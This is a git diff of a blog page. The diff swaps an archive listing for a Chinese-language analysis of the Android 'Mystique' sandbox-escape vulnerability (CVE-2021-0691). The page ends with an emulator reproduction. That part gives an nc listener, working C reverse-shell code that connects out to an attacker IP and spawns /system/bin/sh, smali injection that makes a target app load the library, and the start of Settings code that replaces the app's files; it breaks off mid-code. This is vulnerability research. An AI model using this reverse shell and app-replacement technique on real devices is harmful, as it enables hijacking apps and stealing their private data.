@@ -10,11 +10,10 @@
   })();
 </script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>Archive - liwugang</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>京东安全发现的魔形女漏洞分析 - liwugang</title>
 
-<meta name="description" content="Patient && Courage
-">
-<link rel="canonical" href="https://liwugang.github.io/archive.html"><link rel="alternate" type="application/rss+xml" title="liwugang" href="/feed.xml"><link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-touch-icon.png">
+<meta name="description" content="根据魔形女漏洞网站介绍，可以看到其漏洞可以：  打破应用沙箱机制  可攻击其他 app，读取其 app 私有数据等应用沙箱机制，Android 是使用了 Linux 多用户机制，即每个 app 单独 uid，漏洞竟然能打破这个？看到这个就非常好奇。这个漏洞从公布我就一直关注，直到最近 AOSP 公开了修复 pat...">
+<link rel="canonical" href="https://liwugang.github.io/2021/11/21/analysis_jd_mystique.html"><link rel="alternate" type="application/rss+xml" title="liwugang" href="/feed.xml"><link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">
 <link rel="manifest" href="/assets/favicon/site.webmanifest">
@@ -263,7 +262,7 @@
 </script></head>
   <body>
     <div class="root" data-is-touch="false">
-      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport cell cell--auto">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
 
       <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
       <div class="header__title">
@@ -887,272 +886,384 @@ LTMwVDE0OjE3OjI5KzAwOjAwWUEV4AAAAABJRU5ErkJggg==" />
 </svg>
 <a title="Patient && Courage
 " href="/">liwugang</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
-        <ul><li class="navigation__item navigation__item--active"><a href="/archive.html">Archive</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+        <ul><li class="navigation__item"><a href="/archive.html">Archive</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
       </nav></div>
   </header>
 </div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
 
-              <div class="col-aside d-print-none js-col-aside"></div>
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div></aside></div>
 
               <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
 
-<!-- end custom main top snippet --><article itemscope itemtype="http://schema.org/WebPage"><div class="article__header"><header><h1>Archive</h1></header></div><meta itemprop="headline" content="Archive"><meta itemprop="author" content="liwugang"/><div class="js-article-content"><div class="layout--archive js-all"><div class="site-tags js-tags">
-  <ul class="menu">
-    <li>
-      <button type="button" class="button button--secondary button--pill tag-button tag-button--all" data-encode="">
-        Show All<div class="tag-button__count">37</div>
-      </button>
-    </li><li><button type="button" class="button button--pill tag-button tag-button-4" data-encode="Android">
-          <span>Android</span><div class="tag-button__count">10</div>
-        </button>
-      </li><li><button type="button" class="button button--pill tag-button tag-button-2" data-encode="LeetCode">
-          <span>LeetCode</span><div class="tag-button__count">3</div>
-        </button>
-      </li><li><button type="button" class="button button--pill tag-button tag-button-1" data-encode="Linux">
-          <span>Linux</span><div class="tag-button__count">2</div>
-        </button>
-      </li><li><button type="button" class="button button--pill tag-button tag-button-2" data-encode="Python">
-          <span>Python</span><div class="tag-button__count">3</div>
-        </button>
-      </li><li><button type="button" class="button button--pill tag-button tag-button-2" data-encode="SELinux">
-          <span>SELinux</span><div class="tag-button__count">4</div>
-        </button>
-      </li><li><button type="button" class="button button--pill tag-button tag-button-1" data-encode="Security">
-          <span>Security</span><div class="tag-button__count">1</div>
-        </button>
-      </li><li><button type="button" class="button button--pill tag-button tag-button-2" data-encode="debug">
-          <span>debug</span><div class="tag-button__count">3</div>
-        </button>
-      </li><li><button type="button" class="button button--pill tag-button tag-button-2" data-encode="misc">
-          <span>misc</span><div class="tag-button__count">3</div>
-        </button>
-      </li><li><button type="button" class="button button--pill tag-button tag-button-1" data-encode="openssl">
-          <span>openssl</span><div class="tag-button__count">2</div>
-        </button>
-      </li><li><button type="button" class="button button--pill tag-button tag-button-3" data-encode="reverse">
-          <span>reverse</span><div class="tag-button__count">6</div>
-        </button>
-      </li><li><button type="button" class="button button--pill tag-button tag-button-2" data-encode="tools">
-          <span>tools</span><div class="tag-button__count">4</div>
-        </button>
-      </li></ul>
-</div>
-<div class="js-result layout--archive__result d-none"><div class="article-list items"><section><h2 style="color:#f00" class="article-list__group-header">置顶</h2><ul class="items"></ul><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="SELinux">
-        <div class="item__content"><span class="item__meta">Oct 03,2020</span><a itemprop="headline" class="item__header" href="/2020/10/03/selinux_all.html">深入理解 SELinux</a></div>
-      </li></ul></section><section><h2 class="article-list__group-header">2021</h2><ul class="items"><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Android,Security">
-        <div class="item__content"><span class="item__meta">Nov 21</span><a itemprop="headline" class="item__header" href="/2021/11/21/analysis_jd_mystique.html">京东安全发现的魔形女漏洞分析</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Android">
-        <div class="item__content"><span class="item__meta">Nov 06</span><a itemprop="headline" class="item__header" href="/2021/11/06/download_64_apk.html">如何下载64位的apk？</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Android">
-        <div class="item__content"><span class="item__meta">Jul 11</span><a itemprop="headline" class="item__header" href="/2021/07/11/magisk_enable_adbr_root.html">Magisk 环境下增加 adb root 功能</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Android">
-        <div class="item__content"><span class="item__meta">Apr 07</span><a itemprop="headline" class="item__header" href="/2021/04/07/android_frp.html">Android Factory Reset Protection介绍</a></div>
-      </li></ul></section><section><h2 class="article-list__group-header">2020</h2><ul class="items"><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="reverse">
-        <div class="item__content"><span class="item__meta">Dec 06</span><a itemprop="headline" class="item__header" href="/2020/12/06/reverse_charles.html">破解最新抓包工具 Charles</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Linux">
-        <div class="item__content"><span class="item__meta">Oct 25</span><a itemprop="headline" class="item__header" href="/2020/10/25/introduce_lsm.html">Linux Security Module 框架介绍</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="misc">
-        <div class="item__content"><span class="item__meta">Oct 02</span><a itemprop="headline" class="item__header" href="/2020/10/02/blog_sticky.html">博客修改记录</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="tools">
-        <div class="item__content"><span class="item__meta">Sep 05</span><a itemprop="headline" class="item__header" href="/2020/09/05/markdown_insert_blank.html">markdown 如何插入多个空格？</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="debug">
-        <div class="item__content"><span class="item__meta">Aug 30</span><a itemprop="headline" class="item__header" href="/2020/08/30/header_mismatch.html">记一次头文件不一致导致的异常</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="reverse">
-        <div class="item__content"><span class="item__meta">Aug 01</span><a itemprop="headline" class="item__header" href="/2020/08/01/ghidra.html">Ghidra对局部变量的标识</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="debug">
-        <div class="item__content"><span class="item__meta">May 26</span><a itemprop="headline" class="item__header" href="/2020/05/26/debugging_kernel_with_qemu.html">使用QEMU调试Linux内核</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="debug">
-        <div class="item__content"><span class="item__meta">May 10</span><a itemprop="headline" class="item__header" href="/2020/05/10/gdb_break.html">gdb调试断点</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="reverse">
-        <div class="item__content"><span class="item__meta">Apr 12</span><a itemprop="headline" class="item__header" href="/2020/04/12/reverse_with_frida.html">使用frida hook插件化apk</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="SELinux,Android">
-        <div class="item__content"><span class="item__meta">Mar 31</span><a itemprop="headline" class="item__header" href="/2020/03/31/neverallow_for_build.html">SELinux 编译时 neverallow 如何限制？</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Linux">
-        <div class="item__content"><span class="item__meta">Mar 22</span><a itemprop="headline" class="item__header" href="/2020/03/22/hide_process.html">Linux 下如何隐藏自己不被发现？</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="SELinux,Android">
-        <div class="item__content"><span class="item__meta">Feb 29</span><a itemprop="headline" class="item__header" href="/2020/02/29/coredomain_create_new_property.html">Coredomain 创建新的 property type</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Python">
-        <div class="item__content"><span class="item__meta">Jan 11</span><a itemprop="headline" class="item__header" href="/2020/01/11/auto_input_and_click.html">Python实现自动化点击和输入功能</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="openssl">
-        <div class="item__content"><span class="item__meta">Jan 01</span><a itemprop="headline" class="item__header" href="/2020/01/01/filecrypt_aes.html">filecrypt工具加解密大文件失败问题分析</a></div>
-      </li></ul></section><section><h2 class="article-list__group-header">2019</h2><ul class="items"><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="tools">
-        <div class="item__content"><span class="item__meta">Dec 30</span><a itemprop="headline" class="item__header" href="/2019/12/30/git_commits_en.html">A Tool To Automate Multiple Commits Into One</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Android,SELinux">
-        <div class="item__content"><span class="item__meta">Dec 29</span><a itemprop="headline" class="item__header" href="/2019/12/29/CTS-neverallow.html">Android CTS中neverallow规则生成过程</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="reverse">
-        <div class="item__content"><span class="item__meta">Jul 06</span><a itemprop="headline" class="item__header" href="/2019/07/06/arm_stm_and_ldm.html">ARM中的STM和LDM指令的解析</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="misc">
-        <div class="item__content"><span class="item__meta">May 18</span><a itemprop="headline" class="item__header" href="/2019/05/18/feof_using.html">feof的陷阱</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="reverse">
-        <div class="item__content"><span class="item__meta">May 12</span><a itemprop="headline" class="item__header" href="/2019/05/12/crackme_owasp_android_first.html">OWASP Android crackmes</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="reverse">
-        <div class="item__content"><span class="item__meta">May 11</span><a itemprop="headline" class="item__header" href="/2019/05/11/crackme_cpp_one.html">简单C++ crackme分析</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="tools">
-        <div class="item__content"><span class="item__meta">Apr 28</span><a itemprop="headline" class="item__header" href="/2019/04/28/git_commits.html">Git自动化合并多个Commit</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="openssl">
-        <div class="item__content"><span class="item__meta">Apr 21</span><a itemprop="headline" class="item__header" href="/2019/04/21/openssl_decrypt_fail.html">openssl AES密钥和iv长度问题分析</a></div>
-      </li></ul></section><section><h2 class="article-list__group-header">2017</h2><ul class="items"><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="tools">
-        <div class="item__content"><span class="item__meta">Sep 25</span><a itemprop="headline" class="item__header" href="/2017/09/25/zhaocha.html">找茬游戏辅助工具</a></div>
-      </li></ul></section><section><h2 class="article-list__group-header">2016</h2><ul class="items"><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Python">
-        <div class="item__content"><span class="item__meta">Feb 24</span><a itemprop="headline" class="item__header" href="/2016/02/24/python_compile_error.html">error:Microsoft Visual C++ 9.0 is required (Unable to find vcvarsall.bat). Get it … 解决方案</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Android">
-        <div class="item__content"><span class="item__meta">Feb 21</span><a itemprop="headline" class="item__header" href="/2016/02/21/android_verify_apk.html">android签名证书文件的解析和签名校验的加强</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="LeetCode">
-        <div class="item__content"><span class="item__meta">Jan 15</span><a itemprop="headline" class="item__header" href="/2016/01/15/3_longest_substring_without_repeating_characters.html">3-Longest Substring Without Repeating Characters @LeetCode</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="LeetCode">
-        <div class="item__content"><span class="item__meta">Jan 13</span><a itemprop="headline" class="item__header" href="/2016/01/13/1_two_sum.html">1-Two Sum @LeetCode</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="LeetCode">
-        <div class="item__content"><span class="item__meta">Jan 13</span><a itemprop="headline" class="item__header" href="/2016/01/13/2_add_two_numbers.html">2-Add Two Numbers @LeetCode</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Android">
-        <div class="item__content"><span class="item__meta">Jan 07</span><a itemprop="headline" class="item__header" href="/2016/01/07/LEB128.html">LEB128相关知识</a></div>
-      </li></ul></section><section><h2 class="article-list__group-header">2015</h2><ul class="items"><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Python">
-        <div class="item__content"><span class="item__meta">Nov 29</span><a itemprop="headline" class="item__header" href="/2015/11/29/python_protection.html">类似py2exe软件真的能保护python源码吗</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="misc">
-        <div class="item__content"><span class="item__meta">Aug 21</span><a itemprop="headline" class="item__header" href="/2015/08/21/makefile_ifelse.html">Makefile中的ifeq 多条件使用</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Android">
-        <div class="item__content"><span class="item__meta">Aug 19</span><a itemprop="headline" class="item__header" href="/2015/08/19/android_import_so.html">Android引入动态库so的方法</a></div>
-      </li></div>
-</div>
+<!-- end custom main top snippet --><article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>京东安全发现的魔形女漏洞分析</h1></header></div><meta itemprop="headline" content="京东安全发现的魔形女漏洞分析"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=Android">Android</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=Security">Security</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>Nov 21, 2021</span>
+            </li></ul></div><meta itemprop="author" content="liwugang"/><meta itemprop="datePublished" content="2021-11-21T21:23:00+08:00">
+    <meta itemprop="keywords" content="Android,Security"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet --><div class="article__content" itemprop="articleBody"><p><img src="/assets/pictures/security/jd_intro.png" alt="graph" /></p>
+
+<p>根据<a href="https://dawnslab.jd.com/mystique/">魔形女漏洞</a>网站介绍，可以看到其漏洞可以：</p>
+
+<ul>
+  <li>打破应用沙箱机制</li>
+  <li>可攻击其他 app，读取其 app 私有数据等</li>
+</ul>
+
+<p>应用沙箱机制，Android 是使用了 Linux 多用户机制，即每个 app 单独 uid，漏洞竟然能打破这个？看到这个就非常好奇。</p>
+
+<p>这个漏洞从公布我就一直关注，直到最近 AOSP 公开了修复 patch 才搞清楚到底是怎么回事，本文记录下该漏洞的原理和使用模拟器复现该漏洞。</p>
+
+<!--more-->
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<h3 id="aosp-patch-分析">AOSP patch 分析</h3>
+
+<p>AOSP 针对漏洞发布了两个 CVE，CVE-2021-0515 和 CVE-2021-0691。</p>
+
+<h4 id="cve-2021-0515">CVE-2021-0515</h4>
+
+<p>根据魔形女漏洞网站介绍，该漏洞实际上是本地权限提升漏洞，但结合 CVE-2021-0515 漏洞可进行远程攻击，CVE-2021-0515 修复的是 chromium 相关，是远程攻击链的重要一环，但不是魔形女漏洞最核心的。</p>
+
+<h4 id="cve-2021-0691">CVE-2021-0691</h4>
+
+<p><img src="/assets/pictures/security/cve_intro.png" alt="graph" /></p>
+
+<p>从 google 给的安全等级 Moderate 可以看到，危害并不高，但从上面漏洞描述来看，可以绕过应用沙箱机制，难道危害不高吗？</p>
+
+<p>分析 patch：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">---</span> a/prebuilts/api/30.0/private/system_app.te
++++ b/prebuilts/api/30.0/private/system_app.te
+@@ <span class="nt">-72</span>,12 +72,6 @@
+ <span class="c"># Settings need to access app name and icon from asec</span>
+ allow system_app asec_apk_file:file r_file_perms<span class="p">;</span>
+ 
+-# Allow system_app <span class="o">(</span>adb data loader<span class="o">)</span> to write data to /data/incremental
+<span class="nt">-allow</span> system_app apk_data_file:file write<span class="p">;</span>
+-
+-# Allow system app <span class="o">(</span>adb data loader<span class="o">)</span> to <span class="nb">read </span>logs
+<span class="nt">-allow</span> system_app incremental_control_file:file r_file_perms<span class="p">;</span>
+-
+ <span class="c"># Allow system apps (like Settings) to interact with statsd</span>
+ binder_call<span class="o">(</span>system_app, statsd<span class="o">)</span>
+
+</code></pre></div></div>
+
+<p>修复只是针对 system_app，system_app 是 uid = 1000 并且是系统签名的 apk，修复对 system_app 的权限进行了删除：</p>
+
+<ol>
+  <li>去掉了对 apk_data_file 的写权限， /data/app(/.<em>)? 和 /data/incremental(/.</em>)? 目录为 apk_data_file</li>
+  <li>去掉了对 incremental_control_file 的读文件权限，/data/incremental/MT_[^/] 目录为 incremental_control_file</li>
+</ol>
+
+<p>/data/app 会包含有 app 信息，还有这些 app 所使用的 lib 库。而 /data/incremental 并没有有效文件。</p>
+
+<h4 id="小结">小结</h4>
+
+<ol>
+  <li>能理解危害只有 Moderate，漏洞只影响 system app，这种 app 只有系统厂家才能使用，漏洞利用有限，需要结合 system app 漏洞一起使用</li>
+  <li>若存在 system app 任意代码执行或者任意文件写，可以对 /data/app 目录下 apk 和 lib 库进行修改替换，这样达到突破沙箱限制</li>
+  <li>只能进行修改替换，不能新增文件，因为从现有的权限上看，没有创建文件和添加文件的权限，现有权限为：
+<img src="/assets/pictures/security/apk_perms.png" alt="graph" /></li>
+</ol>
+
+<h3 id="其他漏洞">其他漏洞</h3>
+
+<h4 id="三星漏洞">三星漏洞</h4>
+
+<p><img src="/assets/pictures/security/sam_cve.png" alt="graph" /></p>
+
+<p>从描述上看，该漏洞是可以通用远程 socket 控制 system 用户写文件</p>
+
+<h2 id="总结">总结</h2>
+
+<p><img src="/assets/pictures/security/da_intro.png" alt="graph" /></p>
+
+<p>结合安全大牛徐昊中的评语和上述分析可知，漏洞主要是由于在 Android 11 上增加了 system_app 写 apk_data_file 的权限，在结合厂商的 system app 的漏洞，就可以对 /data/app 下文件进行修改替换，来得到访问/data/app下 app 的私有数据等信息。回过头来看，最开始的对该漏洞的描述，“攻击任何其他应用”描述过于夸大，其实只能攻击三方 app，或者升级后的系统 app，这样的 app 才会将 apk 保存在 /data/app 目录。</p>
+
+<h2 id="复现漏洞">复现漏洞</h2>
+
+<p>漏洞需要结合 system app漏洞，为了方便复现，我这边使用有源码的 lineageos 的模拟器操作，（为什么使用这个？因为我最近刚编译了这个^_^）system app 漏洞可以直接在 settings 上修改。利用的话就是反弹 shell，目标 apk 选择了开源文件管理 <a href="https://github.com/TeamAmaze/AmazeFileManager">AmazeFileManager</a>，使用这个 apk 是由于该 apk 包含有 x86 的 so 文件，模拟器是 x86 架构，不能运行 arm 架构，若是有真机，完全可以对任意 app 进行操作。</p>
+
+<h3 id="复现思路">复现思路</h3>
+
+<ol>
+  <li>本地开启 nc server</li>
+  <li>反射 shell 代码编译成单独的 so</li>
+  <li>然后使用 apktool 工具修改目标 apk 的 smali，将 so 加载进去，获取到修改后的 apk</li>
+  <li>在 settings 上编写代码，修改替换 apk 的 base.apk 和 so 文件</li>
+</ol>
+
+<h4 id="开启-nc-server">开启 nc server</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+nc <span class="nt">-vv</span> <span class="nt">-l</span> <span class="nt">-p</span> 8888  <span class="c"># 本地端口 8888</span>
+
+</code></pre></div></div>
+
+<h4 id="反射-shell-代码">反射 shell 代码</h4>
+
+<p>核心代码</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kt">void</span> <span class="nf">create_reverseshell</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">LOGD</span><span class="p">(</span><span class="s">"In new thread</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">8888</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">revsockaddr</span><span class="p">;</span>
+
+    <span class="kt">int</span> <span class="n">sockt</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">LOGD</span><span class="p">(</span><span class="s">"socket:%d %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sockt</span><span class="p">,</span> <span class="n">errno</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">sockt</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">LOGD</span><span class="p">(</span><span class="s">"error socket"</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">revsockaddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">revsockaddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
+    <span class="n">revsockaddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"XXX.XXX.XXX.XXX"</span><span class="p">);</span> <span class="c1">// nc server IP</span>
+
+    <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">revsockaddr</span><span class="p">,</span>
+            <span class="k">sizeof</span><span class="p">(</span><span class="n">revsockaddr</span><span class="p">));</span>
+    <span class="n">LOGD</span><span class="p">(</span><span class="s">"connect:%d %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="n">errno</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="o">*</span> <span class="k">const</span> <span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/system/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+    <span class="n">execve</span><span class="p">(</span><span class="s">"/system/bin/sh"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">init_function</span><span class="p">()</span> <span class="p">{</span>  <span class="c1">// so 加载后创建</span>
+
+    <span class="n">LOGD</span><span class="p">(</span><span class="s">"Create new thread</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">childid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">childid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">create_reverseshell</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<h4 id="apk-修改">apk 修改</h4>
+
+<p><img src="/assets/pictures/security/path_info.png" alt="graph" /></p>
+
+<p>由于我们有 so 文件，所以需要修改的有 base.apk 和 lib 下的 librootoperations.so 文件，上面分析过，不能添加文件，只能替换，所以需要将我们的 so 替换成 librootoperations.so。</p>
+
+<p class="warning">当然也可以用 java 实现反射 shell 的逻辑，这样就不用修改 so 了</p>
+
+<p>我们将 so 加载放到第一个 activity 里面，修改如下：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="na">class</span> <span class="kd">public</span> <span class="nc">Lcom</span><span class="o">/</span><span class="n">amaze</span><span class="o">/</span><span class="n">filemanager</span><span class="o">/</span><span class="n">ui</span><span class="o">/</span><span class="n">activities</span><span class="o">/</span><span class="nc">MainActivity</span><span class="o">;</span>
+<span class="o">.</span><span class="na">super</span> <span class="nc">Lcom</span><span class="o">/</span><span class="n">amaze</span><span class="o">/</span><span class="n">filemanager</span><span class="o">/</span><span class="n">ui</span><span class="o">/</span><span class="n">activities</span><span class="o">/</span><span class="n">superclasses</span><span class="o">/</span><span class="nc">PermissionsActivity</span><span class="o">;</span>
+<span class="o">.</span><span class="na">source</span> <span class="s">"MainActivity.java"</span>
+
+<span class="o">.</span><span class="na">method</span> <span class="kd">static</span> <span class="n">constructor</span> <span class="o">&lt;</span><span class="n">clinit</span><span class="o">&gt;()</span><span class="no">V</span>
+    <span class="o">.</span><span class="na">locals</span> <span class="mi">1</span>
+    <span class="kd">const</span><span class="o">-</span><span class="n">string</span> <span class="n">v0</span><span class="o">,</span> <span class="s">"rootoperations"</span> <span class="err">#</span> <span class="n">我们添加</span>
+    <span class="n">invoke</span><span class="o">-</span><span class="kd">static</span> <span class="o">{</span><span class="n">v0</span><span class="o">},</span> <span class="nc">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="nc">System</span><span class="o">;-&gt;</span><span class="n">loadLibrary</span><span class="o">(</span><span class="nc">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="nc">String</span><span class="o">;)</span><span class="no">V</span> <span class="err">#</span> <span class="n">我们添加</span>
+
+</code></pre></div></div>
+
+<p>修改完后用 “apktool b” 重新打包并签名，用于后续使用</p>
+
+<h4 id="settings-的修改">Settings 的修改</h4>
+
+<p>我们在开发者选项中增加了修改替换的逻辑，这样打开开发者选项就能触发，将要修改的 apk 和 so 放到 settings 的 files 目录下， 方便操作：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">package</span> <span class="nn">com.android.settings.development</span><span class="o">;</span>
+<span class="o">...</span> <span class="o">...</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DevelopmentSettingsDashboardFragment</span> <span class="kd">extends</span> <span class="nc">RestrictedDashboardFragment</span>
+        <span class="kd">implements</span> <span class="nc">SwitchBar</span><span class="o">.</span><span class="na">OnSwitchChangeListener</span><span class="o">,</span> <span class="nc">OemUnlockDialogHost</span><span class="o">,</span> <span class="nc">AdbDialogHost</span><span class="o">,</span>
+        <span class="nc">AdbClearKeysDialogHost</span><span class="o">,</span> <span class="nc">LogPersistDialogHost</span><span class="o">,</span>
+        <span class="nc">BluetoothA2dpHwOffloadRebootDialog</span><span class="o">.</span><span class="na">OnA2dpHwDialogConfirmedListener</span><span class="o">,</span>
+        <span class="nc">AbstractBluetoothPreferenceController</span><span class="o">.</span><span class="na">Callback</span> <span class="o">{</span>
+<span class="o">...</span> <span class="o">...</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onActivityCreated</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">icicle</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onActivityCreated</span><span class="o">(</span><span class="n">icicle</span><span class="o">);</span>
+        <span class="c1">// Apply page-level restrictions</span>
+        <span class="n">setIfOnlyAvailableForAdmins</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"CVE-TEST"</span><span class="o">,</span> <span class="s">"[+]begin replace"</span><span class="o">);</span>
+        <span class="k">try</span> <span class="o">{</span>
